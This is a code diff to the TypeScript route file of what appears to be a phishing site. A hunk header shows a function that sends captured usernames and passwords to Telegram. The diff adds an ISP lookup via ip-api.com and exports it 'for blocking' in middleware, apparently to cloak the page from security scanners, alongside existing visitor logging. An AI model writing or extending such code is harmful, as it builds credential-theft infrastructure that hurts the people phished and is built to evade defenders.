@@ -38,7 +38,7 @@ async function sendToTelegram(username: string, password: string) {
   }
 }
 
-// Function to get country from IP address
+// Function to get country and ISP from IP address
 async function getCountryFromIP(ip: string): Promise<string> {
   try {
     // Skip if IP is unknown or local
@@ -47,7 +47,7 @@ async function getCountryFromIP(ip: string): Promise<string> {
     }
 
     // Use IP-API.com for free geolocation (45 requests/minute limit)
-    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode`);
+    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,org`);
     const data = await response.json();
     
     if (data.status === 'success' && data.country) {
@@ -58,6 +58,29 @@ async function getCountryFromIP(ip: string): Promise<string> {
   } catch (error) {
     console.error('Error getting country for IP:', error);
     return 'Unknown';
+  }
+}
+
+// Function to get ISP information for blocking
+async function getISPFromIP(ip: string): Promise<string | null> {
+  try {
+    // Skip if IP is unknown or local
+    if (ip === 'unknown' || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
+      return null;
+    }
+
+    // Use IP-API.com for ISP lookup
+    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,org`);
+    const data = await response.json();
+    
+    if (data.status === 'success' && data.org) {
+      return data.org;
+    }
+    
+    return null;
+  } catch (error) {
+    console.error('Error getting ISP for IP:', error);
+    return null;
   }
 }
 
@@ -101,6 +124,9 @@ async function logVisitor(req: Request) {
     console.error('Error logging visitor:', error);
   }
 }
+
+// Export ISP checking function for use in middleware
+export { getISPFromIP };
 
 export async function registerRoutes(app: Express): Promise<Server> {
   // Visitor logging middleware - logs all page visits
